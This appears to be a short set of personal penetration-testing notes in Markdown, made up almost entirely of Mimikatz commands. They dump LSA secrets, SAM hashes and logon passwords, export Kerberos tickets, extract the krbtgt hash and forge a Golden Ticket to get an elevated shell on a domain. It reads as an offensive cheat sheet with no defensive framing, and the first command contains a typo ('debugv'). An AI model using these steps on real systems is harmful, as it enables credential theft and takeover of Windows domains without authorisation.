# Mimikatz

```c
privilege::debugv # enables the _SeDebugPrivilge_ access right
token::elevate # elevate the security token Administrator -> SYSTEM
lsadump::lsa /patch
lsadump::sam
sekurlsa::logonPasswords
```

### lsadumping

```c
privilege::debug
lsadump::lsa /patch
lsadump::sam # Dump SAM database
```

### Kerberos Tickets
```c
kerberos::list /export
```

### Golden Ticket Attacks
Used in [[Attacking-Kerberos]] see the detailed mechanics of Kerberos  [[Active-Directory-Kerberos-Defined]]
```c
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

Provide values for: `kerberos::golden /user: /domain: /sid: /krbtgt: /id`,
like: `kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-SID /krbtgt:HASH /id:ID`,then  
open command prompt with elevated privileges `misc::cmd`.

